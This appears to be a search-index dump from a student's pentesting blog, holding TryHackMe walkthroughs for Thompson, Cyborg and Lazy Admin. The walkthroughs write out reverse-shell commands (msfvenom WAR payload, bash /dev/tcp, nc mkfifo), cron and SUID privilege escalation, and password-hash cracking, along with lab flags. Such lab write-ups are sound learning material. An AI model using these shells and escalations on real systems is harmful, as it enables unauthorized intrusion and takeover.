I\u0026rsquo;ve got first blood on it! The goal was to find a location from a photo. To solve this challange I simply extracted the metadata, and made it flag with it (the syntax was given to us in the challange description).\u003c/p\u003e","title":"swampCTF 2025 - OSINT challenges"},{"content":"Room link: https://tryhackme.com/r/room/bsidesgtthompson\nI started with enumeration\nnmap -oN nmap.txt -Pn -T4 -sC -sV 10.10.188.85 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r8009/tcp open ajp13 Apache Jserv (Protocol v1.3)\r8080/tcp open http Apache Tomcat 8.5.5 I went to the site http://10.10.188.85:8080\nI clicked Manager App and it asked me for a login\nI tried admin:tomcat and tomcat:tomcat but it didn\u0026rsquo;t let me in, so I pressed cancel button and it displayed some interesting information\nBy using username tomcat and password s3cret I was able to log in to the site\nScrolling down, I noticed that I could upload a .war file - I didn\u0026rsquo;t know what it was, but after a quick Google search, I found out that it\u0026rsquo;s a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes\nI checked the available metasploit payloads\nI used java/jsp_shell_reverse_tcp using the\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war \u0026gt; rev.war In the second terminal window I turned on msfconsole and typed:\nuse multi/handler set payload java/jsp_shell_reverse_tcp I also set LHOST and LPORT based on what I typed into msfvenom\nset LHOST=IP set LPORT=PORT at the end i typed exploit\nand I uploaded this exploit to the site\nafter clicking on /rev i was possible to access the shell. I immediately spawned beter one, using python\npython3 -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; Going through the directories, I managed to find the flag of the user\nTime to escalate permissions, I checked sudo -l but it told me to enter the password, so I\u0026rsquo;ll try to find another way\nLet\u0026rsquo;s check the crontab cat /etc/crontab\nwell, and we have something interesting, id.sh in jack\u0026rsquo;s home directory - I\u0026rsquo;ll just check the permissions of this file via the ls -la /home/jack/id.sh command\ngreat, it looks like this could be our way to escalate permissions, let\u0026rsquo;s just check what\u0026rsquo;s in this file\nI will add a reverse shell using echo:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;LHOST\u0026gt;/\u0026lt;LPORT\u0026gt; 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; /home/jack/id.sh in the next terminal window I enabled netcat\nnc -nvlp LPORT and after a while I was able to access the root shell. All that was left was to pull the root flag\n","permalink":"https://manfcg.pl/en/posts/thm-thompson/","summary":"\u003cp\u003eRoom link: \u003ca href=\"https://tryhackme.com/r/room/bsidesgtthompson\"\u003ehttps://tryhackme.com/r/room/bsidesgtthompson\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eI started with enumeration\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oN nmap.txt -Pn -T4 -sC -sV 10.10.188.85\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r\n8009/tcp open  ajp13    Apache Jserv (Protocol v1.3)\r\n8080/tcp open  http     Apache Tomcat 8.5.5\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eI went to the site \u003ccode\u003ehttp://10.10.188.85:8080\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/en/posts/thm-thompson/1.png\"\u003e\u003c/p\u003e\n\u003cp\u003eI clicked Manager App and it asked me for a login\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/en/posts/thm-thompson/2.png\"\u003e\u003c/p\u003e\n\u003cp\u003eI tried \u003ccode\u003eadmin:tomcat\u003c/code\u003e and \u003ccode\u003etomcat:tomcat\u003c/code\u003e but it didn\u0026rsquo;t let me in, so I pressed cancel button and it displayed some interesting information\u003c/p\u003e","title":"THM Writeup - Thompson"},{"content":"Room link: https://tryhackme.com/r/room/cyborgt8\nWe have these questions to answer:\nScan the machine, how many ports are open? What service is running on port 22? What service is running on port 80? What is the user.txt flag? What is the root.txt flag? On port 22 is ssh by default, and on port 80 is http, but first let\u0026rsquo;s check it with a nmap scan - btw, we will then be able to answer question number 1\nnmap -oN nmap.txt -Pn -T4 -sC -sV -p- 10.10.127.219 I immediately received a warning Warning: 10.10.127.219 giving up on port because retransmission cap hit (6).\nSo unfortunately too many requests to the server, I reduced -T4 to -T3 and I deleted -p- and let it go again\nand in the background I ran gobuster\ngobuster dir -o gobuster.txt -u 10.10.127.219 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt It showed me quite interesting directories, such as /admin and /etc\n===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.htpasswd (Status: 403) [Size: 278]\r/.htaccess (Status: 403) [Size: 278]\r/.hta (Status: 403) [Size: 278]\r/admin (Status: 301) [Size: 314] [--\u0026gt; http://10.10.127.219/admin/]\r/etc (Status: 301) [Size: 312] [--\u0026gt; http://10.10.127.219/etc/]\r/index.html (Status: 200) [Size: 11321]\r/server-status (Status: 403) [Size: 278]\rProgress: 4734 / 4735 (99.98%)\r===============================================================\rFinished\r=============================================================== nmap was over at the time and this came out of its output:\nPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) So in answer to question 1, I entered that they\u0026rsquo;re 2 ports open. Btw, it was also able to confirm what is on these ports\nI went to /etc and found 2 files there:\nof which passwd contains quite interesting things to me\nI cracked this hash using John the ripper\njohn --wordlist=/usr/share/wordlists/rockyou.txt passwd success\nI went into the directory /admin after that, and I found \u0026ldquo;Admins\u0026rdquo; in the navbar\nI found out that you need to find a backup named \u0026ldquo;music_archive\u0026rdquo;, so I clicked right on \u0026ldquo;Archive\u0026rdquo; and then it showed me the Download button which allowed me to download the archive.tar file.\nSo a quick unzip of this file flew in\ntar -xf archive.tar Going to home/field/dev/final_archive I noticed various other files, so I did cat to read README file.\nHm, let\u0026rsquo;s check it out\nIt looks like some sort of backup program\nI went into usage, and a bit later I googled borg\u0026rsquo;s github\nI also downloaded it https://github.com/borgbackup/borg/releases\nI listed this previously downloaded archive using borg\n./borg list home/field/dev/final_archive it asked me for a password, so I typed in the previously cracked squidward\nWell, let\u0026rsquo;s try to extract it\n./borg extract home/field/dev/final_archive/::music_archive Asked me again for the password, so I typed squidward.\nhome folder appeared, which contained the user data of user alex\nI decided to check it out, but this time nothing interesting\nI\u0026rsquo;m trying to keep going\nwell we have something, I will try to log into ssh with this\nSuccess! additionally by executing ls I was able to trace the user flag\nDoing sudo -l also managed to discover something that can help escalate privileges\nI\u0026rsquo;ll display for myself what\u0026rsquo;s in that file\nI\u0026rsquo;ll also check the permissions right away\nWell, unfortunately, this time it will not be possible to escalate this user simply by editing this script\nBut, it is worth noting that this script includes the getopts function which is a built-in function for parsing script arguments and options. Tbh, I hadn\u0026rsquo;t heard of this function before, but it caught my attention.\nI used this function, using sudo /etc/mp3backups/backup.sh -c /bin/bash\nWell, and I got shell root. But unfortunately I wasn\u0026rsquo;t getting the output of the commands I typed in\nIn that case, I tried privilege escalation via the SUID bit\nso as root:\nI entered /tmp and I did cp /bin/bash ./bash I also added SUID bit chmod +s bash I typed exit and returned to the user shell as a user I did:\ncd /tmp ls -la I went to gtfobins and I read information on escalating root privileges using the SUID bit\nand I typed as alex the ./bash -p command\nWe have root shell again. Let\u0026rsquo;s see if we can see the output of the commands this time\nGreat, all that\u0026rsquo;s left is cat /root/root.txt\n","permalink":"https://manfcg.pl/en/posts/thm-cyborg/","summary":"\u003cp\u003eRoom link: \u003ca href=\"https://tryhackme.com/r/room/cyborgt8\"\u003ehttps://tryhackme.com/r/room/cyborgt8\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eWe have these questions to answer:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eScan the machine, how many ports are open?\u003c/li\u003e\n\u003cli\u003eWhat service is running on port 22?\u003c/li\u003e\n\u003cli\u003eWhat service is running on port 80?\u003c/li\u003e\n\u003cli\u003eWhat is the user.txt flag?\u003c/li\u003e\n\u003cli\u003eWhat is the root.txt flag?\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn port 22 is ssh by default, and on port 80 is http, but first let\u0026rsquo;s check it with a nmap scan - btw, we will then be able to answer question number 1\u003c/p\u003e","title":"THM Writeup - Cyborg"},{"content":"Room link: https://tryhackme.com/r/room/lazyadmin\nI\u0026rsquo;ll start everything by nmap scan, and on background I\u0026rsquo;ll run gobuster\nnmap -oN nmap.txt -Pn -T4 -sC -sV -p- 10.10.19.199 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) gobuster dir -o gobuster.txt -u 10.10.19.199 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt ===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.hta (Status: 403) [Size: 277]\r/.htaccess (Status: 403) [Size: 277]\r/.htpasswd (Status: 403) [Size: 277]\r/content (Status: 301) [Size: 314] [--\u0026gt; http://10.10.19.199/content/]\r/index.html (Status: 200) [Size: 11321]\r/server-status (Status: 403) [Size: 277] Going to the server address, we are shown the default apache site - so we won\u0026rsquo;t find anything there\nBut in gobuster output I saw, that we have something in /content/\nThis looks interesting, CMS that can be further scanned with gobuster\ngobuster dir -o gobuster2.txt -u http://10.10.19.199/content/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt ===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.htaccess (Status: 403) [Size: 277]\r/.htpasswd (Status: 403) [Size: 277]\r/.hta (Status: 403) [Size: 277]\r/_themes (Status: 301) [Size: 322] [--\u0026gt; http://10.10.19.199/content/_themes/]\r/as (Status: 301) [Size: 317] [--\u0026gt; http://10.10.19.199/content/as/]\r/attachment (Status: 301) [Size: 325] [--\u0026gt; http://10.10.19.199/content/attachment/]\r/images (Status: 301) [Size: 321] [--\u0026gt; http://10.10.19.199/content/images/]\r/inc (Status: 301) [Size: 318] [--\u0026gt; http://10.10.19.199/content/inc/]\r/index.php (Status: 200) [Size: 2198]\r/js (Status: 301) [Size: 317] [--\u0026gt; http://10.10.19.199/content/js/] After browsing through it all for a while, I noticed that:\n/content/as leads to the login interface for this cms /content/inc contains some interesting files And bingo, looking at /content/inc I found an interesting folder named mysql_backup which contains database. I\u0026rsquo;m downloading it because it may contain something interesting\nI opened this file, and I found the user:\nnamed: manager and his password: 42f749ade7f9e195bf475f37a44cafcb I decrypted this hash by pasting it on crackstation and it came up with a password of Password123\nI\u0026rsquo;ll try logging into ssh with these credentials\nPermission denied, please try again. well, it didn\u0026rsquo;t let me in ;/\nIn this case, I\u0026rsquo;ll enter the /as directory, which I found earlier\nAfter entering the manager\u0026rsquo;s login and password, I was able to get on the CMS\nBy the way, I found something that may be of interest to get a reverse shell\nAfter a quick google on this, on exploitdb I found an interesting exploit that allows me to upload a reverse shell https://www.exploit-db.com/exploits/40716\nFirst, I prepared myself a file to upload by changing the port, ip and name to shell.php5 (because it wouldn\u0026rsquo;t upload with .php extension): https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nIn the next terminal window, I immediately enabled netcat listening\nBack to the previous terminal window, I did:\nchmod +x exploit.py python exploit.py I went to this link, and great, I got access to the shell\nI immediately did python --version and when I confirmed the existence of python on the server, I spawned a python shell\npython -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; I also did a cat /etc/passwd to check for some interesting users\nitguy caught my eye, I checked his home dir, and found the user flag\nTHM{63e5bce9271952aad1113b6f1ac28a07} After getting the user flag, I started looking for opportunities to escalate permissions from www-data to something more interesting. I started with the sudo -l command, which showed me something I was interested in\nUser www-data may run the following commands on THM-Chal:\r(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl Doing cat /home/itguy/backup.pl I noticed that this file points to another file -\u0026gt; /etc/copy.sh\ncat /home/itguy/backup.pl #!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;); I also checked this file\ncat /etc/copy.sh Well, and it looks like it includes a reverse shell to help us get shell root\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.0.190 5554 \u0026gt;/tmp/f I slightly took the liberty of modifying it by changing the ip, I also fired up a new window in the terminal and enabled netcat listening\nI returned to the reverse shell window and ran the backup.pl script via sudo\nsudo /usr/bin/perl /home/itguy/backup.pl I went back to the listening window\nAnd success, now just do cd /root and obtainin the root flag using cat root.txt\nTHM{6637f41d0177b6f37cb20d775124699f} ","permalink":"https://manfcg.pl/en/posts/thm-lazy-admin/","summary":"\u003cp\u003eRoom link: \u003ca href=\"https://tryhackme.com/r/room/lazyadmin\"\u003ehttps://tryhackme.com/r/room/lazyadmin\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eI\u0026rsquo;ll start everything by nmap scan, and on background I\u0026rsquo;ll run gobuster\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oN nmap.txt -Pn -T4 -sC -sV -p- 10.10.19.199 \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n\u003c/code\u003e\u003c/pre\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -o gobuster.txt -u 10.10.19.199 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e===============================================================\r\nStarting gobuster in directory enumeration mode\r\n===============================================================\r\n/.hta                 (Status: 403) [Size: 277]\r\n/.htaccess            (Status: 403) [Size: 277]\r\n/.htpasswd            (Status: 403) [Size: 277]\r\n/content              (Status: 301) [Size: 314] [--\u0026gt; http://10.10.19.199/content/]\r\n/index.html           (Status: 200) [Size: 11321]\r\n/server-status        (Status: 403) [Size: 277]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eGoing to the server address, we are shown the default apache site - so we won\u0026rsquo;t find anything there\u003c/p\u003e","title":"THM Writeup - Lazy Admin"},{"content":"\nHello! I am Michał 👋 I am a Computer Science student and Cybersecurity enthusiast 🌱 I’m currently expanding my knowledge in Cybersecurity\n💪 I\u0026rsquo;m strongly focused on Pentesting\n⚡ Interesting fact: My favorite game is Counter-Strike and I have spent about 4,000 hours playing it.\n","permalink":"https://manfcg.pl/en/about/","summary":"\u003cp\u003e\u003cimg alt=\"avatar\" loading=\"lazy\" src=\"/en/about/avatar.png#center\"\u003e\u003c/p\u003e\n\u003ch2 id=\"hello-i-am-michał-\"\u003eHello! I am Michał 👋\u003c/h2\u003e\n\u003ch3 id=\"i-am-a-computer-science-student-and-cybersecurity-enthusiast\"\u003eI am a Computer Science student and Cybersecurity enthusiast\u003c/h3\u003e\n\u003cp\u003e🌱 I’m currently expanding my knowledge in \u003cstrong\u003eCybersecurity\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e💪 I\u0026rsquo;m strongly focused on \u003cstrong\u003ePentesting\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e⚡ Interesting fact: My favorite game is Counter-Strike and I have spent about 4,000 hours playing it.\u003c/p\u003e","title":"About me"}]